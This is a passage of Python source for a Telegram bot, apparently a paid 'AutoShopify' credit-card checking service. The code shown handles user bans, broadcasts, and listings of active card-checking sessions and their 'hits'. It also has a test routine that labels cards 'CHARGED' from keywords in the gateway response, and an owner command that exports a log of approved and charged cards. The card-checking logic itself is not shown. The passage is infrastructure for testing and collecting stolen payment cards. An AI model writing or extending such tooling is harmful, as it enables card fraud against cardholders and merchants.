            await client.send_message(user_id, premium_emoji(f"? 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙧 𝘽𝙖𝙙 𝙂𝙪𝙮", mode="md"))
        except:
            pass

    except ValueError:
        await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!", mode="md"))
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if not is_admin(event.sender_id):
        return await event.reply(premium_emoji("? 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!", mode="md"))

    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")

        user_id = int(parts[1])

        if not await is_banned_user(user_id):
            return await event.reply(premium_emoji(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!", mode="md"))

        success = await unban_user(user_id)

        if success:
            await event.reply(premium_emoji(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!", mode="md"))

            try:
                await client.send_message(user_id, premium_emoji(f"💎 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.", mode="md"))
            except:
                pass
        else:
            await event.reply(premium_emoji(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}", mode="md"))

    except ValueError:
        await event.reply(premium_emoji("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!", mode="md"))
    except Exception as e:
        await event.reply(premium_emoji(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}", mode="md"))

async def initialize_bot():
    """Initialize bot files and admin IDs - called from main.py"""
    await initialize_files()
    await load_admin_ids()

    # Create a wrapper for get_cc_limit that can be used by external modules
    def get_cc_limit_wrapper(access_type, user_id=None):
        return get_cc_limit(access_type, user_id)
    
    utils_for_all = {
        'can_use': can_use,
        'banned_user_message': banned_user_message,
        'access_denied_message_with_button': access_denied_message_with_button,
        'extract_card': extract_card,
        'extract_all_cards': extract_all_cards,
        'get_bin_info': get_bin_info,
        'save_approved_card': save_approved_card,
        'get_cc_limit': get_cc_limit_wrapper,
        'pin_charged_message': pin_charged_message,
        'ADMIN_ID': ADMIN_ID,
        'load_json': load_json,
        'save_json': save_json
    }

    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 ?")

async def run_telethon():
    """Run Telethon client as userbot only - aiogram handles bot functionality."""
    # Start as userbot, not bot - aiogram will handle bot functionality
    await client.start()

    # --- REBOOT NOTIFICATION LOGIC ---
    if os.path.exists(REBOOT_FLAG_FILE):
        try:
            os.remove(REBOOT_FLAG_FILE)
            await asyncio.sleep(2)
            await client.send_message(OWNER_ID, premium_emoji("✅ <b>Reboot Successful!</b>\n<b>Bot is online.</b>"), parse_mode='html')
        except Exception as e:
            print(f"Failed to send reboot message: {e}")
    # ---------------------------------

    await client.run_until_disconnected()

async def run_aiogram():
    """Run aiogram bot for all bot functionality."""
    await aiogram_bot.delete_webhook(drop_pending_updates=True)
    log_info("SYSTEM", "Aiogram webhook deleted")
    log_info("SYSTEM", "Starting aiogram polling...")
    log_info("SYSTEM", f"Bot ID: {aiogram_bot.id}")
    try:
        await aiogram_dp.start_polling(aiogram_bot, allowed_updates=["message", "callback_query"])
    except Exception as e:
        log_info("SYSTEM", f"Aiogram polling error: {e}")
        raise

async def main():
    """Main async entry point - runs both Telethon and aiogram concurrently."""
    await initialize_files()
    await load_admin_ids()
    
    log_info("SYSTEM", "Starting AutoShopify Bot (Dual Framework: Telethon + aiogram)...")
    try:
        print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 ?")
    except UnicodeEncodeError:
        print("BOT RUNNING ?")
    
    # Run both frameworks concurrently
    await asyncio.gather(
        run_telethon(),
        run_aiogram()
    )

@client.on(events.NewMessage(pattern='/test'))
async def test_logic(event):
    card = "4111111111111111|12|2025|123"
    # Simulated API Response
    res = {"Response": "Order completed", "Gate": "Shopify", "Price": "5.00"}
    
    response_text = res.get("Response", "").lower()
    charged_keywords = ["charged", "order_paid", "order_placed", "order completed", "order placed", "thank you", "payment successful", "💎"]
    
    if any(key in response_text for key in charged_keywords):
        status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💰"
        await event.reply(premium_emoji(f"{status_header}\n\n𝗖𝗖 ⇾ `{card}`\n𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {res['Response']}\n\n✅ Logic Test Passed!", mode="md"))
    else:
        await event.reply(premium_emoji("❌ Logic Test Failed - Keyword not found.", mode="md"))
        
# --- BROADCAST SYSTEM ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.](?:broadcast|bc)(?:\s+([\s\S]+))?$'))
async def broadcast_cmd(event):
    if not is_admin(event.sender_id):
        return await event.reply(premium_emoji("💎 Admin Only!", mode="md"))
    msg = event.pattern_match.group(1)
    if not msg: return await event.reply("Usage: `/bc Hello Everyone` balance")
    
    status_msg = await event.reply(premium_emoji("💎 **Broadcasting...**", mode="md"))
    premium = await load_json(PREMIUM_FILE)
    free = await load_json(FREE_FILE)
    all_users = set(premium.keys()) | set(free.keys())
    
    sent, failed = 0, 0
    for u_id in all_users:
        try:
            await client.send_message(int(u_id), premium_emoji(msg, mode="md"))
            sent += 1
            await asyncio.sleep(0.1) # Prevent flooding
        except: failed += 1
            
    await status_msg.edit(premium_emoji(f"✅ **Broadcast Complete!**\n? Sent: `{sent}`\n? Failed: `{failed}`", mode="md"))

# --- DIRECT MESSAGE SYSTEM ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]msg(?:\s+(\d+)\s+([\s\S]+))?$'))
async def msg_cmd(event):
    if not is_admin(event.sender_id): return
    target_id = event.pattern_match.group(1)
    msg = event.pattern_match.group(2)
    if not target_id or not msg: return await event.reply("Usage: `/msg [ID] [Text]`")
    
    try:
        await client.send_message(int(target_id), premium_emoji(msg, mode="md"))
        await event.reply(premium_emoji(f"✅ Message sent to `{target_id}`", mode="md"))
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Failed: {e}", mode="md"))
        
@client.on(events.NewMessage(pattern=r'(?i)^[/.]active$'))
async def active_cmd(event):
    if not is_admin(event.sender_id): return
    if not ACTIVE_PROCESSES:
        return await event.reply(premium_emoji("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙨.```", mode="md"))

    msg = "🚀 **𝘼𝙘𝙩𝙞𝙫𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙚𝙨𝙨𝙞𝙤𝙣𝙨**\n━━━━━━━━━━━━━━━━━━\n\n"
    for uid, data in ACTIVE_PROCESSES.items():
        batch_id = USER_BATCHES.get(uid, "N/A")
        gate = data.get("gate") or BATCH_TASKS.get(str(batch_id), {}).get("gate", "Unknown")
        msg += f"💎 **𝙐𝙨𝙚𝙧:** {data['name']} (`{uid}`)\n"
        msg += f"🎱 **𝘽𝙖𝙩𝙘𝙝 𝙄𝘿:** `{batch_id}`\n"
        msg += f"⚙️ **𝗚𝗮𝘁𝗲𝙬𝙖𝙮** ⇾ **{gate}**\n"
        msg += f"📊 **𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨:** `{data['checked']}/{data['total']}`\n"
        msg += f"💰 **𝙃𝙞𝙩𝙨:** `{data['hits']}`\n"
        msg += "━━━━━━━━━━━━━━━━━━\n"
    await event.reply(premium_emoji(msg, mode="md"))
        
# --- ADMIN CC LOG EXPORTER ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]getcc$'))
async def export_cc_log_handler(event):
    # 1. Security Check
    if not is_owner(event.sender_id):
        return 

    # Use the global CC_FILE variable
    cc_file_path = CC_FILE

    # 2. Check if file exists and has content
    if not os.path.exists(cc_file_path) or os.path.getsize(cc_file_path) == 0:
        return await event.reply(premium_emoji("❌ **No hits found.** The CC log is currently empty.", mode="md"))

    try:
        user_hits_data, id_to_name_map, hit_entries, global_approved, global_charged = await parse_cc_log()
        line_count = len(hit_entries)
        file_size = os.path.getsize(cc_file_path) / 1024 # KB
        top_users = sorted(user_hits_data.items(), key=lambda x: x[1]["total"], reverse=True)[:5]
        top_text = "\n".join([f"👤 {id_to_name_map.get(uid, 'Unknown')} (`{uid}`): `{stats['total']}` hits" for uid, stats in top_users]) or "No users found"
        
        status = await event.reply(premium_emoji(f"💎 **Preparing CC Database...** ({file_size:.2f} KB)", mode="md"))

        # 4. Send the file
        await event.respond(
            f"💳 **Full Hits Database (cc.txt)**\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 Total Hits Logged: `{line_count}`\n"
            f"✅ Approved: `{global_approved}`\n"
            f"💎 Charged: `{global_charged}`\n"
            f"\n**Top Users:**\n{top_text}\n"
            f"💎 File Size: `{file_size:.2f} KB`\n"
            f"💎 Exported on: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
            f"━━━━━━━━━━━━━━━━━━",
            file=cc_file_path
        )
        
        await status.delete()
        log_info("SYSTEM", f"Admin {event.sender_id} exported the full CC database.")

    except Exception as e:
        await event.reply(premium_emoji(f"❌ **Failed to export CC log:**\n`{str(e)}`", mode="md"))        
        
# --- ADMIN LOG EXPORTER ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]logs$'))
async def export_logs_handler(event):
    # 1. Security Check
    if not is_owner(event.sender_id):
        return 

    log_file = "bot_log.txt"

    # 2. Check if file exists
    if not os.path.exists(log_file):
        return await event.reply(premium_emoji("❌ **No log file found.** It seems the bot hasn't recorded anything yet.", mode="md"))

    try:
        # 3. Get file info
        file_size = os.path.getsize(log_file) / (1024 * 1024) # Convert to MB
        
        status = await event.reply(premium_emoji(f"💎 **Preparing log file...** ({file_size:.2f} MB)", mode="md"))

        # 4. Send the file
        await event.respond(
            f"💎 **Bot Activity Log**\n"
            f"💎 Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"💎 Size: `{file_size:.2f} MB`",
            file=log_file
        )
        
        await status.delete()
        log_info("SYSTEM", f"Admin {event.sender_id} exported the log file.")

    except Exception as e:
        await event.reply(premium_emoji(f"❌ **Failed to export logs:**\n`{str(e)}`", mode="md"))        

# --- REBOOT SYSTEM ---
@client.on(events.NewMessage(pattern=r'(?i)^[/.]reboot$'))
async def reboot_cmd(event):
    if not is_owner(event.sender_id):
        return

    try:
        await event.reply(
            premium_emoji("🔄 <b>Rebooting via BAT runner...</b>\n<b>I will be back online in a few seconds.</b>"),
            parse_mode='html'
        )
    except Exception:
        pass

    try:
        with open(REBOOT_FLAG_FILE, "w") as f:
            f.write("rebooted")
    except Exception as e:
        log_info("SYSTEM", f"Failed to write reboot flag: {e}")

    log_info("SYSTEM", "Cold reboot signal triggered by Owner. Exiting process loop.")
    trigger_hard_reboot()

if __name__ == "__main__":
    asyncio.run(main())



